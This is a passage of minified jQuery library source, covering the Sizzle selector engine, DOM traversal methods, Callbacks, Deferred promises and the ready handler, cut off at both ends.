for(;t=t[o];)if(1===t.nodeType||a)if(c=(u=t[H]||(t[H]={}))[t.uniqueID]||(u[t.uniqueID]={}),r&&r===t.nodeName.toLowerCase())t=t[o]||t;else{if((d=c[i])&&d[0]===B&&d[1]===s)return p[2]=d[2];if(c[i]=p,p[2]=e(t,n,l))return!0}return!1}}function m(e){return e.length>1?function(t,n,o){for(var r=e.length;r--;)if(!e[r](t,n,o))return!1;return!0}:e[0]}function g(e,n,o){for(var r=0,i=n.length;r<i;r++)t(e,n[r],o);return o}function y(e,t,n,o,r){for(var i,a=[],s=0,l=e.length,d=null!=t;s<l;s++)(i=e[s])&&(n&&!n(i,o,r)||(a.push(i),d&&t.push(s)));return a}function b(e,t,n,r,i,a){return r&&!r[H]&&(r=b(r)),i&&!i[H]&&(i=b(i,a)),o(function(o,a,s,l){var d,c,u,p=[],f=[],h=a.length,m=o||g(t||"*",s.nodeType?[s]:s,[]),b=!e||!o&&t?m:y(m,p,e,s,l),x=n?i||(o?e:h||r)?[]:a:b;if(n&&n(b,x,s,l),r)for(d=y(x,f),r(d,[],s,l),c=d.length;c--;)(u=d[c])&&(x[f[c]]=!(b[f[c]]=u));if(o){if(i||e){if(i){for(d=[],c=x.length;c--;)(u=x[c])&&d.push(b[c]=u);i(null,x=[],d,l)}for(c=x.length;c--;)(u=x[c])&&(d=i?ee(o,u):p[c])>-1&&(o[d]=!(a[d]=u))}}else x=y(x===a?x.splice(h,x.length):x),i?i(null,a,x,l):Y.apply(a,x)})}function x(e){for(var t,n,o,r=e.length,i=k.relative[e[0].type],a=i||k.relative[" "],s=i?1:0,l=h(function(e){return e===t},a,!0),d=h(function(e){return ee(t,e)>-1},a,!0),c=[function(e,n,o){var r=!i&&(o||n!==P)||((t=n).nodeType?l(e,n,o):d(e,n,o));return t=null,r}];s<r;s++)if(n=k.relative[e[s].type])c=[h(m(c),n)];else{if((n=k.filter[e[s].type].apply(null,e[s].matches))[H]){for(o=++s;o<r&&!k.relative[e[o].type];o++);return b(s>1&&m(c),s>1&&f(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace(se,"$1"),n,s<o&&x(e.slice(s,o)),o<r&&x(e=e.slice(o)),o<r&&f(e))}c.push(n)}return m(c)}function v(e,n){var r=n.length>0,i=e.length>0,a=function(o,a,s,l,d){var c,u,p,f=0,h="0",m=o&&[],g=[],b=P,x=o||i&&k.find.TAG("*",d),v=B+=null==b?1:Math.random()||.1,w=x.length;for(d&&(P=a===L||a||d);h!==w&&null!=(c=x[h]);h++){if(i&&c){for(u=0,a||c.ownerDocument===L||(A(c),s=!I);p=e[u++];)if(p(c,a||L,s)){l.push(c);break}d&&(B=v)}r&&((c=!p&&c)&&f--,o&&m.push(c))}if(f+=h,r&&h!==f){for(u=0;p=n[u++];)p(m,g,a,s);if(o){if(f>0)for(;h--;)m[h]||g[h]||(g[h]=V.call(l));g=y(g)}Y.apply(l,g),d&&!o&&g.length>0&&f+n.length>1&&t.uniqueSort(l)}return d&&(B=v,P=b),m};return r?o(a):a}var w,_,k,E,T,C,S,j,P,D,M,A,L,N,I,O,z,R,F,H="sizzle"+1*new Date,q=e.document,B=0,$=0,W=n(),G=n(),U=n(),J=function(e,t){return e===t&&(M=!0),0},Z={}.hasOwnProperty,X=[],V=X.pop,Q=X.push,Y=X.push,K=X.slice,ee=function(e,t){for(var n=0,o=e.length;n<o;n++)if(e[n]===t)return n;return-1},te="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",ne="[\\x20\\t\\r\\n\\f]",oe="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",re="\\["+ne+"*("+oe+")(?:"+ne+"*([*^$|!~]?=)"+ne+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+oe+"))|)"+ne+"*\\]",ie=":("+oe+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+re+")*)|.*)\\)|)",ae=new RegExp(ne+"+","g"),se=new RegExp("^"+ne+"+|((?:^|[^\\\\])(?:\\\\.)*)"+ne+"+$","g"),le=new RegExp("^"+ne+"*,"+ne+"*"),de=new RegExp("^"+ne+"*([>+~]|"+ne+")"+ne+"*"),ce=new RegExp("="+ne+"*([^\\]'\"]*?)"+ne+"*\\]","g"),ue=new RegExp(ie),pe=new RegExp("^"+oe+"$"),fe={ID:new RegExp("^#("+oe+")"),CLASS:new RegExp("^\\.("+oe+")"),TAG:new RegExp("^("+oe+"|[*])"),ATTR:new RegExp("^"+re),PSEUDO:new RegExp("^"+ie),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+ne+"*(even|odd|(([+-]|)(\\d*)n|)"+ne+"*(?:([+-]|)"+ne+"*(\\d+)|))"+ne+"*\\)|)","i"),bool:new RegExp("^(?:"+te+")$","i"),needsContext:new RegExp("^"+ne+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+ne+"*((?:-\\d)?\\d*)"+ne+"*\\)|)(?=[^-]|$)","i")},he=/^(?:input|select|textarea|button)$/i,me=/^h\d$/i,ge=/^[^{]+\{\s*\[native \w/,ye=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,be=/[+~]/,xe=new RegExp("\\\\([\\da-f]{1,6}"+ne+"?|("+ne+")|.)","ig"),ve=function(e,t,n){var o="0x"+t-65536;return o!=o||n?t:o<0?String.fromCharCode(o+65536):String.fromCharCode(o>>10|55296,1023&o|56320)},we=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,_e=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},ke=function(){A()},Ee=h(function(e){return!0===e.disabled&&("form"in e||"label"in e)},{dir:"parentNode",next:"legend"});try{Y.apply(X=K.call(q.childNodes),q.childNodes),X[q.childNodes.length].nodeType}catch(e){Y={apply:X.length?function(e,t){Q.apply(e,K.call(t))}:function(e,t){for(var n=e.length,o=0;e[n++]=t[o++];);e.length=n-1}}}for(w in _=t.support={},T=t.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},A=t.setDocument=function(e){var t,n,o=e?e.ownerDocument||e:q;return o!==L&&9===o.nodeType&&o.documentElement?(N=(L=o).documentElement,I=!T(L),q!==L&&(n=L.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",ke,!1):n.attachEvent&&n.attachEvent("onunload",ke)),_.attributes=r(function(e){return e.className="i",!e.getAttribute("className")}),_.getElementsByTagName=r(function(e){return e.appendChild(L.createComment("")),!e.getElementsByTagName("*").length}),_.getElementsByClassName=ge.test(L.getElementsByClassName),_.getById=r(function(e){return N.appendChild(e).id=H,!L.getElementsByName||!L.getElementsByName(H).length}),_.getById?(k.filter.ID=function(e){var t=e.replace(xe,ve);return function(e){return e.getAttribute("id")===t}},k.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&I){var n=t.getElementById(e);return n?[n]:[]}}):(k.filter.ID=function(e){var t=e.replace(xe,ve);return function(e){var n="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return n&&n.value===t}},k.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&I){var n,o,r,i=t.getElementById(e);if(i){if((n=i.getAttributeNode("id"))&&n.value===e)return[i];for(r=t.getElementsByName(e),
o=0;i=r[o++];)if((n=i.getAttributeNode("id"))&&n.value===e)return[i]}return[]}}),k.find.TAG=_.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):_.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,o=[],r=0,i=t.getElementsByTagName(e);if("*"===e){for(;n=i[r++];)1===n.nodeType&&o.push(n);return o}return i},k.find.CLASS=_.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&I)return t.getElementsByClassName(e)},z=[],O=[],(_.qsa=ge.test(L.querySelectorAll))&&(r(function(e){N.appendChild(e).innerHTML="<a id='"+H+"'></a><select id='"+H+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&O.push("[*^$]="+ne+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||O.push("\\["+ne+"*(?:value|"+te+")"),e.querySelectorAll("[id~="+H+"-]").length||O.push("~="),e.querySelectorAll(":checked").length||O.push(":checked"),e.querySelectorAll("a#"+H+"+*").length||O.push(".#.+[+~]")}),r(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=L.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&O.push("name"+ne+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&O.push(":enabled",":disabled"),N.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&O.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),O.push(",.*:")})),(_.matchesSelector=ge.test(R=N.matches||N.webkitMatchesSelector||N.mozMatchesSelector||N.oMatchesSelector||N.msMatchesSelector))&&r(function(e){_.disconnectedMatch=R.call(e,"*"),R.call(e,"[s!='']:x"),z.push("!=",ie)}),O=O.length&&new RegExp(O.join("|")),z=z.length&&new RegExp(z.join("|")),t=ge.test(N.compareDocumentPosition),F=t||ge.test(N.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,o=t&&t.parentNode;return e===o||!(!o||1!==o.nodeType||!(n.contains?n.contains(o):e.compareDocumentPosition&&16&e.compareDocumentPosition(o)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},J=t?function(e,t){if(e===t)return M=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n||(1&(n=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!_.sortDetached&&t.compareDocumentPosition(e)===n?e===L||e.ownerDocument===q&&F(q,e)?-1:t===L||t.ownerDocument===q&&F(q,t)?1:D?ee(D,e)-ee(D,t):0:4&n?-1:1)}:function(e,t){if(e===t)return M=!0,0;var n,o=0,r=e.parentNode,i=t.parentNode,s=[e],l=[t];if(!r||!i)return e===L?-1:t===L?1:r?-1:i?1:D?ee(D,e)-ee(D,t):0;if(r===i)return a(e,t);for(n=e;n=n.parentNode;)s.unshift(n);for(n=t;n=n.parentNode;)l.unshift(n);for(;s[o]===l[o];)o++;return o?a(s[o],l[o]):s[o]===q?-1:l[o]===q?1:0},L):L},t.matches=function(e,n){return t(e,null,null,n)},t.matchesSelector=function(e,n){if((e.ownerDocument||e)!==L&&A(e),n=n.replace(ce,"='$1']"),_.matchesSelector&&I&&!U[n+" "]&&(!z||!z.test(n))&&(!O||!O.test(n)))try{var o=R.call(e,n);if(o||_.disconnectedMatch||e.document&&11!==e.document.nodeType)return o}catch(e){}return t(n,L,null,[e]).length>0},t.contains=function(e,t){return(e.ownerDocument||e)!==L&&A(e),F(e,t)},t.attr=function(e,t){(e.ownerDocument||e)!==L&&A(e);var n=k.attrHandle[t.toLowerCase()],o=n&&Z.call(k.attrHandle,t.toLowerCase())?n(e,t,!I):void 0;return void 0!==o?o:_.attributes||!I?e.getAttribute(t):(o=e.getAttributeNode(t))&&o.specified?o.value:null},t.escape=function(e){return(e+"").replace(we,_e)},t.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},t.uniqueSort=function(e){var t,n=[],o=0,r=0;if(M=!_.detectDuplicates,D=!_.sortStable&&e.slice(0),e.sort(J),M){for(;t=e[r++];)t===e[r]&&(o=n.push(r));for(;o--;)e.splice(n[o],1)}return D=null,e},E=t.getText=function(e){var t,n="",o=0,r=e.nodeType;if(r){if(1===r||9===r||11===r){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=E(e)}else if(3===r||4===r)return e.nodeValue}else for(;t=e[o++];)n+=E(t);return n},(k=t.selectors={cacheLength:50,createPseudo:o,match:fe,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(xe,ve),e[3]=(e[3]||e[4]||e[5]||"").replace(xe,ve),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||t.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&t.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return fe.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&ue.test(n)&&(t=C(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(xe,ve).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=W[e+" "];return t||(t=new RegExp("(^|"+ne+")"+e+"("+ne+"|$)"))&&W(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,n,o){return function(r){var i=t.attr(r,e);return null==i?"!="===n:!n||(i+="","="===n?i===o:"!="===n?i!==o:"^="===n?o&&0===i.indexOf(o):"*="===n?o&&i.indexOf(o)>-1:"$="===n?o&&i.slice(-o.length)===o:"~="===n?(" "+i.replace(ae," ")+" ").indexOf(o)>-1:"|="===n&&(i===o||i.slice(0,o.length+1)===o+"-"))}},CHILD:function(e,t,n,o,r){var i="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===o&&0===r?function(e){return!!e.parentNode}:function(t,n,l){var d,c,u,p,f,h,m=i!==a?"nextSibling":"previousSibling",g=t.parentNode,y=s&&t.nodeName.toLowerCase(),b=!l&&!s,x=!1;if(g){if(i){for(;m;){for(p=t;p=p[m];)if(s?p.nodeName.toLowerCase()===y:1===p.nodeType)return!1;h=m="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?g.firstChild:g.lastChild],a&&b){for(x=(f=(d=(c=(u=(p=g)[H]||(p[H]={}))[p.uniqueID]||(u[p.uniqueID]={}))[e]||[])[0]===B&&d[1])&&d[2],p=f&&g.childNodes[f];p=++f&&p&&p[m]||(x=f=0)||h.pop();)if(1===p.nodeType&&++x&&p===t){c[e]=[B,f,x];break}}else if(b&&(x=f=(d=(c=(u=(p=t)[H]||(p[H]={}))[p.uniqueID]||(u[p.uniqueID]={}))[e]||[])[0]===B&&d[1]),!1===x)for(;(p=++f&&p&&p[m]||(x=f=0)||h.pop())&&((s?p.nodeName.toLowerCase()!==y:1!==p.nodeType)||!++x||(b&&((c=(u=p[H]||(p[H]={}))[p.uniqueID]||(u[p.uniqueID]={}))[e]=[B,x]),p!==t)););return(x-=r)===o||x%o==0&&x/o>=0}}},PSEUDO:function(e,n){var r,i=k.pseudos[e]||k.setFilters[e.toLowerCase()]||t.error("unsupported pseudo: "+e);return i[H]?i(n):i.length>1?(r=[e,e,"",n],k.setFilters.hasOwnProperty(e.toLowerCase())?o(function(e,t){for(var o,r=i(e,n),a=r.length;a--;)e[o=ee(e,r[a])]=!(t[o]=r[a])}):function(e){return i(e,0,r)}):i}},pseudos:{not:o(function(e){var t=[],n=[],r=S(e.replace(se,"$1"));return r[H]?o(function(e,t,n,o){for(var i,a=r(e,null,o,[]),s=e.length;s--;)(i=a[s])&&(e[s]=!(t[s]=i))}):function(e,o,i){return t[0]=e,r(t,null,i,n),t[0]=null,!n.pop()}}),has:o(function(e){return function(n){return t(e,n).length>0}}),contains:o(function(e){return e=e.replace(xe,ve),function(t){return(t.textContent||t.innerText||E(t)).indexOf(e)>-1}}),lang:o(function(e){return pe.test(e||"")||t.error("unsupported lang: "+e),e=e.replace(xe,ve).toLowerCase(),function(t){var n;do{if(n=I?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return(n=n.toLowerCase())===e||0===n.indexOf(e+"-")}while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===N},focus:function(e){return e===L.activeElement&&(!L.hasFocus||L.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:d(!1),disabled:d(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!k.pseudos.empty(e)},header:function(e){return me.test(e.nodeName)},input:function(e){return he.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:c(function(){return[0]}),last:c(function(e,t){return[t-1]}),eq:c(function(e,t,n){return[n<0?n+t:n]}),even:c(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:c(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:c(function(e,t,n){for(var o=n<0?n+t:n;--o>=0;)e.push(o);return e}),gt:c(function(e,t,n){for(var o=n<0?n+t:n;++o<t;)e.push(o);return e})}}).pseudos.nth=k.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})k.pseudos[w]=s(w);for(w in{submit:!0,reset:!0})k.pseudos[w]=l(w);return p.prototype=k.filters=k.pseudos,k.setFilters=new p,C=t.tokenize=function(e,n){var o,r,i,a,s,l,d,c=G[e+" "];if(c)return n?0:c.slice(0);for(s=e,l=[],d=k.preFilter;s;){for(a in o&&!(r=le.exec(s))||(r&&(s=s.slice(r[0].length)||s),l.push(i=[])),o=!1,(r=de.exec(s))&&(o=r.shift(),i.push({value:o,type:r[0].replace(se," ")}),s=s.slice(o.length)),k.filter)!(r=fe[a].exec(s))||d[a]&&!(r=d[a](r))||(o=r.shift(),i.push({value:o,type:a,matches:r}),s=s.slice(o.length));if(!o)break}return n?s.length:s?t.error(e):G(e,l).slice(0)},S=t.compile=function(e,t){var n,o=[],r=[],i=U[e+" "];if(!i){for(t||(t=C(e)),n=t.length;n--;)(i=x(t[n]))[H]?o.push(i):r.push(i);(i=U(e,v(r,o))).selector=e}return i},j=t.select=function(e,t,n,o){var r,i,a,s,l,d="function"==typeof e&&e,c=!o&&C(e=d.selector||e);if(n=n||[],1===c.length){if((i=c[0]=c[0].slice(0)).length>2&&"ID"===(a=i[0]).type&&9===t.nodeType&&I&&k.relative[i[1].type]){if(!(t=(k.find.ID(a.matches[0].replace(xe,ve),t)||[])[0]))return n;d&&(t=t.parentNode),e=e.slice(i.shift().value.length)}for(r=fe.needsContext.test(e)?0:i.length;r--&&(a=i[r],!k.relative[s=a.type]);)if((l=k.find[s])&&(o=l(a.matches[0].replace(xe,ve),be.test(i[0].type)&&u(t.parentNode)||t))){if(i.splice(r,1),!(e=o.length&&f(i)))return Y.apply(n,o),n;break}}return(d||S(e,c))(o,t,!I,n,!t||be.test(e)&&u(t.parentNode)||t),n},_.sortStable=H.split("").sort(J).join("")===H,_.detectDuplicates=!!M,A(),_.sortDetached=r(function(e){return 1&e.compareDocumentPosition(L.createElement("fieldset"))}),r(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||i("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),_.attributes&&r(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||i("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),r(function(e){return null==e.getAttribute("disabled")})||i(te,function(e,t,n){var o;if(!n)return!0===e[t]?t.toLowerCase():(o=e.getAttributeNode(t))&&o.specified?o.value:null}),t}(e);we.find=ke,we.expr=ke.selectors,we.expr[":"]=we.expr.pseudos,we.uniqueSort=we.unique=ke.uniqueSort,we.text=ke.getText,we.isXMLDoc=ke.isXML,we.contains=ke.contains,we.escapeSelector=ke.escape;var Ee=function(e,t,n){for(var o=[],r=void 0!==n;(e=e[t])&&9!==e.nodeType;)if(1===e.nodeType){if(r&&we(e).is(n))break;o.push(e)}return o},Te=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},Ce=we.expr.match.needsContext,Se=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;we.filter=function(e,t,n){var o=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===o.nodeType?we.find.matchesSelector(o,e)?[o]:[]:we.find.matches(e,we.grep(t,function(e){return 1===e.nodeType}))},we.fn.extend({find:function(e){var t,n,o=this.length,r=this;if("string"!=typeof e)return this.pushStack(we(e).filter(function(){for(t=0;t<o;t++)if(we.contains(r[t],this))return!0}));for(n=this.pushStack([]),t=0;t<o;t++)we.find(e,r[t],n);return o>1?we.uniqueSort(n):n},filter:function(e){return this.pushStack(a(this,e||[],!1))},not:function(e){return this.pushStack(a(this,e||[],!0))},is:function(e){return!!a(this,"string"==typeof e&&Ce.test(e)?we(e):e||[],!1).length}});var je,Pe=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(we.fn.init=function(e,t,n){var o,r;if(!e)return this;if(n=n||je,"string"==typeof e){if(!(o="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:Pe.exec(e))||!o[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(o[1]){if(t=t instanceof we?t[0]:t,we.merge(this,we.parseHTML(o[1],t&&t.nodeType?t.ownerDocument||t:ae,!0)),Se.test(o[1])&&we.isPlainObject(t))for(o in t)be(this[o])?this[o](t[o]):this.attr(o,t[o]);return this}return(r=ae.getElementById(o[2]))&&(this[0]=r,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):be(e)?void 0!==n.ready?n.ready(e):e(we):we.makeArray(e,this)}).prototype=we.fn,je=we(ae);var De=/^(?:parents|prev(?:Until|All))/,Me={children:!0,contents:!0,next:!0,prev:!0};we.fn.extend({has:function(e){var t=we(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(we.contains(this,t[e]))return!0})},closest:function(e,t){var n,o=0,r=this.length,i=[],a="string"!=typeof e&&we(e);if(!Ce.test(e))for(;o<r;o++)for(n=this[o];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?a.index(n)>-1:1===n.nodeType&&we.find.matchesSelector(n,e))){i.push(n);break}return this.pushStack(i.length>1?we.uniqueSort(i):i)},index:function(e){return e?"string"==typeof e?ue.call(we(e),this[0]):ue.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(we.uniqueSort(we.merge(this.get(),we(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),we.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return Ee(e,"parentNode")},parentsUntil:function(e,t,n){return Ee(e,"parentNode",n)},next:function(e){return s(e,"nextSibling")},prev:function(e){return s(e,"previousSibling")},nextAll:function(e){return Ee(e,"nextSibling")},prevAll:function(e){return Ee(e,"previousSibling")},nextUntil:function(e,t,n){return Ee(e,"nextSibling",n)},prevUntil:function(e,t,n){return Ee(e,"previousSibling",n)},siblings:function(e){return Te((e.parentNode||{}).firstChild,e)},children:function(e){return Te(e.firstChild)},contents:function(e){return i(e,"iframe")?e.contentDocument:(i(e,"template")&&(e=e.content||e),we.merge([],e.childNodes))}},function(e,t){we.fn[e]=function(n,o){var r=we.map(this,t,n);return"Until"!==e.slice(-5)&&(o=n),o&&"string"==typeof o&&(r=we.filter(o,r)),this.length>1&&(Me[e]||we.uniqueSort(r),De.test(e)&&r.reverse()),this.pushStack(r)}});var Ae=/[^\x20\t\r\n\f]+/g;we.Callbacks=function(e){e="string"==typeof e?l(e):we.extend({},e);var t,n,r,i,a=[],s=[],d=-1,c=function(){for(i=i||e.once,r=t=!0;s.length;d=-1)for(n=s.shift();++d<a.length;)!1===a[d].apply(n[0],n[1])&&e.stopOnFalse&&(d=a.length,n=!1);e.memory||(n=!1),t=!1,i&&(a=n?[]:"")},u={add:function(){return a&&(n&&!t&&(d=a.length-1,s.push(n)),function r(t){we.each(t,function(t,n){be(n)?e.unique&&u.has(n)||a.push(n):n&&n.length&&"string"!==o(n)&&r(n)})}(arguments),n&&!t&&c()),this},remove:function(){return we.each(arguments,function(e,t){for(var n;(n=we.inArray(t,a,n))>-1;)a.splice(n,1),n<=d&&d--}),this},has:function(e){return e?we.inArray(e,a)>-1:a.length>0},empty:function(){return a&&(a=[]),this},disable:function(){return i=s=[],a=n="",this},disabled:function(){return!a},lock:function(){return i=s=[],n||t||(a=n=""),this},locked:function(){return!!i},fireWith:function(e,n){return i||(n=[e,(n=n||[]).slice?n.slice():n],s.push(n),t||c()),this},fire:function(){return u.fireWith(this,arguments),this},fired:function(){return!!r}};return u},we.extend({Deferred:function(t){var n=[["notify","progress",we.Callbacks("memory"),we.Callbacks("memory"),2],["resolve","done",we.Callbacks("once memory"),we.Callbacks("once memory"),0,"resolved"],["reject","fail",we.Callbacks("once memory"),we.Callbacks("once memory"),1,"rejected"]],o="pending",r={state:function(){return o},always:function(){return i.done(arguments).fail(arguments),this},"catch":function(e){return r.then(null,e)},pipe:function(){var e=arguments;return we.Deferred(function(t){we.each(n,function(n,o){var r=be(e[o[4]])&&e[o[4]];i[o[1]](function(){var e=r&&r.apply(this,arguments);e&&be(e.promise)?e.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[o[0]+"With"](this,r?[e]:arguments)})}),e=null}).promise()},then:function(t,o,r){function i(t,n,o,r){return function(){var s=this,l=arguments,u=function(){var e,u;if(!(t<a)){if((e=o.apply(s,l))===n.promise())throw new TypeError("Thenable self-resolution");u=e&&("object"==typeof e||"function"==typeof e)&&e.then,be(u)?r?u.call(e,i(a,n,d,r),i(a,n,c,r)):(a++,u.call(e,i(a,n,d,r),i(a,n,c,r),i(a,n,d,n.notifyWith))):(o!==d&&(s=void 0,l=[e]),(r||n.resolveWith)(s,l))}},p=r?u:function(){try{u()}catch(e){we.Deferred.exceptionHook&&we.Deferred.exceptionHook(e,p.stackTrace),t+1>=a&&(o!==c&&(s=void 0,l=[e]),n.rejectWith(s,l))}};t?p():(we.Deferred.getStackHook&&(p.stackTrace=we.Deferred.getStackHook()),e.setTimeout(p))}}var a=0;return we.Deferred(function(e){n[0][3].add(i(0,e,be(r)?r:d,e.notifyWith)),n[1][3].add(i(0,e,be(t)?t:d)),n[2][3].add(i(0,e,be(o)?o:c))}).promise()},promise:function(e){return null!=e?we.extend(e,r):r}},i={};return we.each(n,function(e,t){var a=t[2],s=t[5];r[t[1]]=a.add,s&&a.add(function(){o=s},n[3-e][2].disable,n[3-e][3].disable,n[0][2].lock,n[0][3].lock),a.add(t[3].fire),i[t[0]]=function(){return i[t[0]+"With"](this===i?void 0:this,arguments),this},i[t[0]+"With"]=a.fireWith}),r.promise(i),t&&t.call(i,i),i},when:function(e){var t=arguments.length,n=t,o=Array(n),r=le.call(arguments),i=we.Deferred(),a=function(e){return function(n){o[e]=this,r[e]=arguments.length>1?le.call(arguments):n,--t||i.resolveWith(o,r)}};if(t<=1&&(u(e,i.done(a(n)).resolve,i.reject,!t),"pending"===i.state()||be(r[n]&&r[n].then)))return i.then();for(;n--;)u(r[n],a(n),i.reject);return i.promise()}});var Le=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;we.Deferred.exceptionHook=function(t,n){e.console&&e.console.warn&&t&&Le.test(t.name)&&e.console.warn("jQuery.Deferred exception: "+t.message,t.stack,n)},we.readyException=function(t){e.setTimeout(function(){throw t})};var Ne=we.Deferred();we.fn.ready=function(e){return Ne.then(e)["catch"](function(e){we.readyException(e)}),this},we.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--we.readyWait:we.isReady)||(we.isReady=!0,!0!==e&&--we.readyWait>0||Ne.resolveWith(ae,[we]))}}),we.ready.then=Ne.then,"complete"===ae.readyState||"loading"!==ae.readyState&&!ae.documentElement.doScroll?e.setTimeout(we.ready):(ae.addEventListener("DOMContentLoaded",p),e.addEventListener("load",p));var Ie=function(e,t,n,r,i,a,s){var l=0,d=e.length,c=null==n;if("object"===o(n))for(l in i=!0,n)Ie(e,t,l,n[l],!0,a,s);else if(void 0!==r&&(i=!0,be(r)||(s=!0),c&&(s?(t.call(e,r),t=null):(c=t,t=function(e,t,n){return c.call(we(e),n)})),t))for(;l<d;l++)t(e[l],n,s?r:r.call(e[l],l,t(e[l],n)));return i?e:c?t.call(e):d?t(e[0],n):a},Oe=/^-ms-/,ze=/-([a-z])/g,Re=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};m.uid=1,m.prototype={cache:function(e){var t=e[this.expando];return t||(t={},Re(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var o,r=this.cache(e);if("string"==typeof t)r[h(t)]=n;else for(o in t)r[h(o)]=t[o];return 